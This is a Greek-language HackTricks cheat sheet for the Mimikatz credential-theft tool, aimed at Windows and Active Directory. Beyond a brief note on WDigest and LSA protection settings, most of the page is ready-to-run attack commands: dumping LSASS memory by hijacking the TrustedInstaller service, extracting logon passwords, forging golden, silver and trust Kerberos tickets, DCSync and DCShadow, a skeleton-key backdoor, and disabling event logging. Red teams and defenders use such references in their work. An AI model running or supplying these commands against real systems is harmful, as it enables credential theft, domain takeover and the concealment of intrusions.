# Mimikatz

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε** [**💬**](https://emojipedia.org/speech-balloon/) [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Αυτή η σελίδα βασίζεται σε μια από το [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Ελέγξτε το πρωτότυπο για περαιτέρω πληροφορίες!

## LM και κείμενο σε μνήμη

Από τα Windows 8.1 και τα Windows Server 2012 R2 και μετά, έχουν ληφθεί σημαντικά μέτρα για την προστασία από την κλοπή διαπιστευτηρίων:

- Οι **κατακερματισμένες LM και οι κωδικοί πρόσβασης σε καθαρό κείμενο** δεν αποθηκεύονται πλέον στη μνήμη για να ενισχυθεί η ασφάλεια. Πρέπει να ρυθμιστεί μια συγκεκριμένη ρύθμιση του μητρώου, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, με μια τιμή DWORD `0` για να απενεργοποιηθεί η διάσπαση των κωδικών πρόσβασης, εξασφαλίζοντας ότι οι κωδικοί "καθαρού κειμένου" δεν αποθηκεύονται στην προσωπική υπηρεσία αυθεντικοποίησης (LSASS).

- Η **προστασία LSA** εισάγεται για να προστατεύσει τη διαδικασία της Τοπικής Αρχής Ασφαλείας (LSA) από μη εξουσιοδοτημένη ανάγνωση μνήμης και εισαγωγή κώδικα. Αυτό επιτυγχάνεται με τον σήμανση του LSASS ως προστατευμένη διαδικασία. Η ενεργοποίηση της προστασίας LSA περιλαμβάνει:
1. Τροποποίηση του μητρώου στο _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ με την ρύθμιση `RunAsPPL` σε `dword:00000001`.
2. Εφαρμογή ενός αντικειμένου ομάδας πολιτικής (GPO) που επιβάλλει αυτήν την αλλαγή του μητρώου σε όλες τις διαχειριζόμενες συσκευές.

Παρά τις προστασίες αυτές, εργαλεία όπως το Mimikatz μπορούν να παρακάμψουν την προστασία LSA χρησιμοποιώντας συγκεκριμένους οδηγούς, αν και τέτοιες ενέργειες πιθανόν να καταγράφονται στα αρχεία καταγραφής συμβάντων.

### Αντιμετώπιση της αφαίρεσης του SeDebugPrivilege

Οι διαχειριστές συνήθως έχουν το SeDebugPrivilege, που τους επιτρέπει να εντοπίζουν σφάλματα σε προγράμματα. Αυτό το προνόμιο μπορεί να περιοριστεί για να αποτραπούν μη εξουσιοδοτημένες αντιγραφές μνήμης, μια συνηθισμένη τεχνική που χρησιμοποιούν οι επιτιθέμενοι για να αντλήσουν διαπιστευτήρια από τη μνήμη. Ωστόσο, ακόμα και με αυτό το προνόμιο αφαιρεμένο, ο λογαριασμός TrustedInstaller μπορεί ακόμα να εκτελέσει αντιγραφές μνήμης χρησιμοποιώντας μια προσαρμοσμένη διαμόρφωση υπηρεσίας:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Αυτό επιτρέπει την αποθήκευση της μνήμης του `lsass.exe` σε ένα αρχείο, το οποίο μπορεί στη συνέχεια να αναλυθεί σε ένα άλλο σύστημα για την εξαγωγή διαπιστευτηρίων:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Επιλογές του Mimikatz

Η παραπληροφόρηση των αρχείων καταγραφής συμβάντων στο Mimikatz περιλαμβάνει δύο κύριες ενέργειες: τη διαγραφή των αρχείων καταγραφής συμβάντων και την τροποποίηση της υπηρεσίας Συμβάντων για να αποτραπεί η καταγραφή νέων συμβάντων. Παρακάτω παρατίθενται οι εντολές για την εκτέλεση αυτών των ενεργειών:

#### Διαγραφή των αρχείων καταγραφής συμβάντων

- **Εντολή**: Αυτή η ενέργεια αποσκοπεί στη διαγραφή των αρχείων καταγραφής συμβάντων, καθιστώντας πιο δύσκολη την ανίχνευση κακόβουλων δραστηριοτήτων.
- Το Mimikatz δεν παρέχει μια άμεση εντολή στην τυπική τεκμηρίωσή του για τη διαγραφή των αρχείων καταγραφής συμβάντων απευθείας μέσω της γραμμής εντολών του. Ωστόσο, η παραπληροφόρηση των αρχείων καταγραφής συνήθως περιλαμβάνει τη χρήση εργαλείων συστήματος ή σεναρίων εκτός του Mimikatz για τη διαγραφή συγκεκριμένων αρχείων καταγραφής (π.χ. χρησιμοποιώντας το PowerShell ή τον Προβολέα Συμβάντων των Windows).

#### Πειραματική δυνατότητα: Τροποποίηση της υπηρεσίας Συμβάντων

- **Εντολή**: `event::drop`
- Αυτή η πειραματική εντολή έχει σχεδιαστεί για να τροποποιήσει τη συμπεριφορά της υπηρεσίας καταγραφής συμβάντων, αποτρέποντας αποτελεσματικά την καταγραφή νέων συμβάντων.
- Παράδειγμα: `mimikatz "privilege::debug" "event::drop" exit`

- Η εντολή `privilege::debug` εξασφαλίζει ότι το Mimikatz λειτουργεί με τα απαραίτητα προνόμια για την τροποποίηση των υπηρεσιών του συστήματος.
- Η εντολή `event::drop` τροποποιεί την υπηρεσία καταγραφής συμβάντων.

### Επιθέσεις σε εισιτήρια Kerberos

### Δημιουργία Χρυσού Εισιτηρίου

Ένα Χρυσό Εισιτήριο επιτρέπει την παραπληροφόρηση πρόσβασης σε όλο τον τομέα. Κύρια εντολή και παράμετροι:

- Εντολή: `kerberos::golden`
- Παράμετροι:
- `/domain`: Το όνομα του τομέα.
- `/sid`: Ο αναγνωριστικός αριθμός ασφαλείας (SID) του τομέα.
- `/user`: Το όνομα χρήστη που θα παραπληροφορηθεί.
- `/krbtgt`: Το NTLM hash του λογαριασμού υπηρεσίας KDC του τομέα.
- `/ptt`: Ενσωματώνει απευθείας το εισιτήριο στη μνήμη.
- `/ticket`: Αποθηκεύει το εισιτήριο για μεταγενέστερη χρήση.

Παράδειγμα:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Δημιουργία Silver Ticket

Τα Silver Tickets παρέχουν πρόσβαση σε συγκεκριμένες υπηρεσίες. Κύρια εντολή και παράμετροι:

- Εντολή: Παρόμοια με το Golden Ticket αλλά στοχεύει σε συγκεκριμένες υπηρεσίες.
- Παράμετροι:
- `/service`: Η υπηρεσία που στοχεύεται (π.χ., cifs, http).
- Άλλες παράμετροι παρόμοιες με το Golden Ticket.

Παράδειγμα:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Δημιουργία εισιτηρίου εμπιστοσύνης

Τα εισιτήρια εμπιστοσύνης χρησιμοποιούνται για την πρόσβαση σε πόρους από διαφορετικούς τομείς εκμεταλλευόμενοι τις σχέσεις εμπιστοσύνης. Κύρια εντολή και παράμετροι:

- Εντολή: Παρόμοια με το Golden Ticket αλλά για τις σχέσεις εμπιστοσύνης.
- Παράμετροι:
- `/target`: Το πλήρες όνομα του τομέα προορισμού.
- `/rc4`: Το NTLM hash για τον λογαριασμό εμπιστοσύνης.

Παράδειγμα:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Επιπλέον Εντολές Kerberos

- **Λίστα Εισιτηρίων**:
- Εντολή: `kerberos::list`
- Εμφανίζει όλα τα εισιτήρια Kerberos για την τρέχουσα συνεδρία χρήστη.

- **Πέρασμα της Κρυφής Μνήμης**:
- Εντολή: `kerberos::ptc`
- Εισάγει εισιτήρια Kerberos από αρχεία μνήμης.
- Παράδειγμα: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Πέρασμα του Εισιτηρίου**:
- Εντολή: `kerberos::ptt`
- Επιτρέπει τη χρήση ενός εισιτηρίου Kerberos σε μια άλλη συνεδρία.
- Παράδειγμα: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Εκκαθάριση Εισιτηρίων**:
- Εντολή: `kerberos::purge`
- Καθαρίζει όλα τα εισιτήρια Kerberos από τη συνεδρία.
- Χρήσιμο πριν από τη χρήση εντολών παραπλάνησης εισιτηρίων για να αποφευχθούν συγκρούσεις.


### Παρεμβολή στο Active Directory

- **DCShadow**: Καθιστά προσωρινά μια μηχανή να λειτουργεί ως DC για την παραπλάνηση αντικειμένων AD.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Προσομοιώνει ένα DC για να ζητήσει δεδομένα κωδικών πρόσβασης.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Πρόσβαση σε Διαπιστευτήρια

- **LSADUMP::LSA**: Εξαγωγή διαπιστευτηρίων από το LSA.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Παραπλανά ένα DC χρησιμοποιώντας τα δεδομένα κωδικού πρόσβασης ενός λογαριασμού υπολογιστή.
- *Δεν παρέχεται συγκεκριμένη εντολή για το NetSync στο αρχικό περιεχόμενο.*

- **LSADUMP::SAM**: Πρόσβαση στην τοπική βάση δεδομένων SAM.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Αποκρυπτογράφηση μυστικών που αποθηκεύονται στο μητρώο.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Ορίζει ένα νέο NTLM hash για έναν χρήστη.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Ανάκτηση πληροφοριών ελέγχου εμπιστοσύνης.
- `mimikatz "lsadump::trust" exit`

### Διάφορα

- **MISC::Skeleton**: Εισάγει μια πίσω πόρτα στο LSASS σε ένα DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Ανέλιξη Προνομίων

- **PRIVILEGE::Backup**: Απόκτηση δικαιωμάτων αντιγράφου ασφαλείας.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Απόκτηση προνομίων αποσφαλμάτωσης.
- `mimikatz "privilege::debug" exit`

### Αποκομιδή Διαπιστευτηρίων

- **SEKURLSA::LogonPasswords**: Εμφάνιση διαπιστευτηρίων για συνδεδεμένους χρήστες.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Εξαγωγή εισιτηρίων Kerberos από τη μνήμη.
- `mimikatz "sekurlsa::tickets /export" exit`

### Παρεμβολή Sid και Token

- **SID::add/modify**: Αλλαγή SID και SIDHistory.
- Προσθήκη: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Τροποποίηση: *Δεν παρέχεται συγκεκριμένη εντολή για τροποποίηση στο αρχικό περιεχόμενο.*

- **TOKEN::Elevate**: Παραπλάνηση διακριτικών.
- `mimikatz "token::elevate /domainadmin" exit`

### Υπηρεσίες Τερματικού

- **TS::MultiRDP**: Επιτρέπει πολλαπλές συνεδρίες RDP.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Καταχωρεί τις συνεδρίες TS/RDP.
- *Δεν παρέχεται συγκεκριμένη εντολή για TS::Sessions στο αρχικό περιεχόμενο.*

### Θησαυροφυλάκιο

- Εξαγωγή κωδικών πρόσβασης από το Θησαυροφυλάκιο των Windows.
- `mimikatz "vault::cred /patch" exit`


<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον επαγγελματία με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο χάκινγκ υποβάλλοντας PRs στο** [**α
